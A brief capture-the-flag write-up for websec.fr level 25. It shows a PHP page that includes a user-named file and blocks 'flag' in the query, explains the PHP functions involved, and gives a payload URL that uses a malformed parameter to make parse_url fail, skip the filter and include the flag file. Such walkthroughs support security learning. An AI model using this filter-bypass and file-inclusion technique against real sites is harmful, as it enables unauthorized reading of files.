```
<?php
parse_str(parse_url($_SERVER['REQUEST_URI'])['query'], $query);
foreach ($query as $k => $v) {
if (stripos($v, 'flag') !== false)
     die('You are not allowed to get the flag, sorry :/');
}
include $_GET['page'] . '.txt';
?>
```
parse_url: parses the url and return its components.<br>
parse_str: parses the string to variables.<br>
stripos: finds at what position a particular string is present(case insensitive)<br>
`$_SERVER['REQUEST_URI']` will return the URI of the webpage.<br>
Eg: if the url is : https://www/google.com/example/example.php, then `$_SERVER['REQUEST_UR1']` will contain /example/example.php.<br>
clue given in source code:  Yeah, the webserver is configured so that you can't directly access .txt files :)<br>
                        And no, PHP wrappers aren't the only way to have fun!<br><br>
So, the function parse_url returns false when we give a malformed URL. <br>
So, our final payload can be: <br>
https://websec.fr/level25/index.php?page=flag&link=localhost:1337<br>
note: The port cannot be parsed when the address given is wrong.




